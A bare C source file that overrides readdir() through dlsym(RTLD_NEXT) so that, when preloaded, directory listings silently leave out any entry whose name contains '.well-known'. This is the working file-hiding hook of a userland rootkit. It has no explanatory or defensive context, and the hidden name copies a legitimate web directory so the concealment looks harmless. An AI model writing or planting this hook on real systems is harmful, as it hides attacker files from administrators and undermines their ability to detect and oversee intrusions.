#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
 
#define FILENAME ".well-known"
 
struct dirent *(*original_readdir)(DIR *);
struct dirent *readdir(DIR *dirp) 
{
    struct dirent *ret;
     
    original_readdir = dlsym (RTLD_NEXT, "readdir");
    while((ret = original_readdir(dirp)))
    {
        if(strstr(ret->d_name,FILENAME) == 0 ) 
            break;
    }
    return ret;
}
